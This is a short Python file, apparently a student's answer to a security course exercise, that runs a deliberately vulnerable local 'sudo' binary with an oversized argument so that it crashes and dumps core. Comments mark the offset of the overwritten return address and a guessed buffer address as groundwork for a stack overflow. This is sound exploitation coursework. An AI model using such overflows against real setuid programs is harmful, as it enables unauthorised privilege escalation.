import os
import sys


def crash_sudo(path_to_sudo: str):
    """
    Execute the sudo program so that it crashes and generates a core dump.

    The same rules and tips from q1.py still apply (you must use the
    `path_to_sudo` value, prefer `os.execl` over `os.system`).

    :param path_to_sudo: The path to the vulnerable sudo program.
    """
    # Your code goes here.
    #raise NotImplementedError()
    let_them_crash = ""
    
    for i in range(10, 138):#create a string big enough, warning: don't 
        #insert '\0' character, so just start from 10
        let_them_crash += chr(i)
    
    #in index 77-10 , to 80-10 it's the eip we want to overwrite
    #with our buffer address    
    #0xbfffdfc9 is the address of the beginning of the buffer?
    
    os.execl(path_to_sudo, path_to_sudo, let_them_crash, "ls")

def main(argv):
    # WARNING: Avoid changing this function.
    if not len(argv) == 1:
        print('Usage: %s' % argv[0])
        sys.exit(1)

    crash_sudo(path_to_sudo='./sudo')


if __name__ == '__main__':
    main(sys.argv)
